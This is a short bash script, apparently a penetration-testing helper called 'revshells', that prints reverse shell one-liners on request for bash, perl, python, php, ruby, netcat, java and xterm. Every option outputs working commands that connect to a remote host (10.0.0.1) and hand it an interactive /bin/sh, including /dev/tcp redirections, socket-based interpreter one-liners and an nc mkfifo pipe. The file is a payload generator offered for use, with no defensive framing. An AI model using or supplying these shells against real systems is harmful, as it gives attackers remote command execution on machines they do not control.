#!/usr/bin/env bash

function usage(){
    clear
    echo "./revshells [bash|perl|python|php|ruby|nc|netcat|java|xterm]"
    exit
}

if [[ $# -eq 0 ]];then
    usage
fi

while [[ $# -gt 0 ]];do
    case $1 in
	bash)
	    bashShell=('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1' "bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'")
	    echo  -e "\e[1;33m--> BASH REVSHELLS:\e[0m"
	    for i in "${bashShell[@]}";do echo "$i";done | nl
	    shift
	    ;;
	perl)
	    perlShell=("perl -e \'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};")
	    echo -e "\e[1;33m--> PERL REVSHELLS:\e[0m"
	    for i in "${perlShell[@]}";do echo "$i";done | nl
	    shift
	    ;;
	python)
	    pythonShell=("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);")
	    echo -e "\e[1;33m--> PYTHON REVSHELLS:\e[0m"
	    for i in "${pythonShell[@]}";do echo "$i";done | nl
	    shift
	    ;;
	php)
	    phpShell=("php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
	    echo -e "\e[1;33m--> PHP REVSHELLS:\e[0m"
	    for i in "${phpShell[@]}";do echo "$i";done | nl
	    shift
	    ;;
	ruby)
	    rubyShell=("ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
	    echo -e "\e[1;33m--> RUBY REVSHELLS:\e[0m"
	    for i in "${rubyShell[@]}";do echo "$i";done | nl
	    shift
	    ;;
	nc)
	    ncShell=("nc -e /bin/sh 10.0.0.1 1234" "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f")
	    echo -e "\e[1;33m--> nc REVSHELLS:\e[0m"
	    for i in "${ncShell[@]}";do echo "$i";done | nl
	    shift
	    ;;
	java)
	    javaShell=("r = Runtime.getRuntime() \n \
	p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[]) \n \
	p.waitFor()")
	    echo -e "\e[1;33m--> JAVA REVSHELLS:\e[0m"
	    for i in "${javaShell[@]}";do echo "$i";done | nl
	    shift
	    ;;
	xterm)
	    xtermShell=("xterm -display 10.0.0.1:1")
	    echo -e "\e[1;33m--> XTERM REVSHELLS: [ On localhost execute: Xnest :1]\e[0m"
	    for i in "${xtermShell[@]}";do echo "$i";done | nl
	    shift
	    ;;
	*) usage ;;
    esac
done
